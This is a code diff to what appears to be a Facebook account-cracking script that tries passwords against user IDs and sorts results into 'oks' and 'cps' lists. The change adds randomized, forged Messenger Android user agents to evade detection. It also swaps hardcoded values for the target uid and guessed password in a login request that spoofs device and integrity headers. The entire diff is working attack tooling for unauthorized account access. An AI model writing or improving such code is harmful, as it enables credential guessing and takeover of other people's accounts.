@@ -1525,6 +1525,53 @@ def p(uid,pwx,tl):
         #print({error})
         pass
 
+def generate_random_orca_agent() -> str:
+    # Realistic Samsung devices, their matching board/device IDs, and valid builds
+    samsung_devices = [
+        {"model": "SM-G960N", "build": "PQ3A.190605.03171033", "brand": "samsung"}, # Galaxy S9
+        {"model": "SM-G973N", "build": "RP1A.200720.012", "brand": "samsung"},     # Galaxy S10
+        {"model": "SM-G981N", "build": "SP1A.210812.016", "brand": "samsung"},     # Galaxy S20
+        {"model": "SM-A526N", "build": "TP1A.220624.014", "brand": "samsung"},     # Galaxy A52 5G
+        {"model": "SM-A536N", "build": "UKQ1.230705.002", "brand": "samsung"},     # Galaxy A53 5G
+    ]
+    
+    # Messenger (Orca) application versions and build version codes
+    orca_versions = [
+        {"av": "500.1.0.71.108", "bv": "713721466"},
+        {"av": "498.0.0.65.102", "bv": "711204859"},
+        {"av": "495.2.0.59.98",  "bv": "708492015"},
+        {"av": "490.0.0.44.110", "bv": "701948374"},
+    ]
+    
+    # Common Indonesian network carriers matching your in_ID locale
+    carriers = ["PSN", "Telkomsel", "Indosat", "XL Axiata", "Smartfren", "3"]
+    
+    # Random selection logic
+    device = random.choice(samsung_devices)
+    app = random.choice(orca_versions)
+    carrier = random.choice(carriers)
+    
+    # Dynamic system metrics
+    android_ver = str(random.randint(9, 13))
+    density = round(random.uniform(2.0, 4.0), 1)
+    width = random.choice([720, 900, 1080, 1440])
+    height = random.choice([1280, 1600, 1920, 2400, 2560])
+    
+    # Constructed structured user agent
+    ua = (
+        f"Dalvik/2.1.0 (Linux; U; Android {android_ver}; "
+        f"{device['model']} Build/{device['build']}) "
+        f"[FBAN/Orca-Android;FBAV/{app['av']};"
+        f"FBPN/com.facebook.orca;FBLC/in_ID;"
+        f"FBBV/{app['bv']};FBCR/{carrier};"
+        f"FBMF/{device['brand']};FBBD/{device['brand']};"
+        f"FBDV/{device['model']};FBSV/{android_ver};"
+        f"FBCA/x86_64:arm64-v8a;"
+        f"FBDM/{{density={density},width={width},height={height}}};"
+        f"FB_FW/1;]"
+    )
+    return ua
+
 def x(uid,pwx,tl):
     global oks
     global cps
@@ -1551,7 +1598,7 @@ def x(uid,pwx,tl):
             'x-fb-device-group': '7637',
             'x-fb-integrity-machine-id': 'ujvAaf4BjiKVSe-fT2dB2Q1v',
             'x-zero-eh': '664c0faaac849cb891d0a261fbb72a12',
-            'user-agent': '[FBAN/FB4A;FBAV/565.0.0.49.74;FBBV/992346742;FBDM/{density=2.4,width=1080,height=2149};FBLC/id_ID;FBRV/0;FBCR/XL;FBMF/Xiaomi;FBBD/POCO;FBPN/com.facebook.katana;FBDV/M2010J19CG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
+            'user-agent': generate_random_orca_agent(),
             'x-graphql-request-purpose': 'fetch',
             'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
             'x-zero-f-device-id': '6fb84474-8dec-4d1c-a5fe-70fe4c2decea',
@@ -1571,7 +1618,7 @@ def x(uid,pwx,tl):
             'x-fb-client-ip': 'True',
             'x-fb-server-cluster': 'True',
             'x-fb-conn-uuid-client': '+KICAyif8dofWZ3R9QuCKw==',}
-            apcb = '#PWD_FB4A:0:{}:{}'.format(str(int(time.time())), '938259')
+            apcb = '#PWD_MSGR:0:{}:{}'.format(str(int(time.time())), pw)
             params = {
                 "method": "post",
                 "pretty": "false",
@@ -1605,7 +1652,7 @@ def x(uid,pwx,tl):
                                     "event_flow": "login_manual",
                                     "event_step": "home_page",
                                     "is_from_logged_in_switcher": False,
-                                    "contact_point": '100048966394519|',
+                                    "contact_point": uid,
                                 }
                             })
                         }),
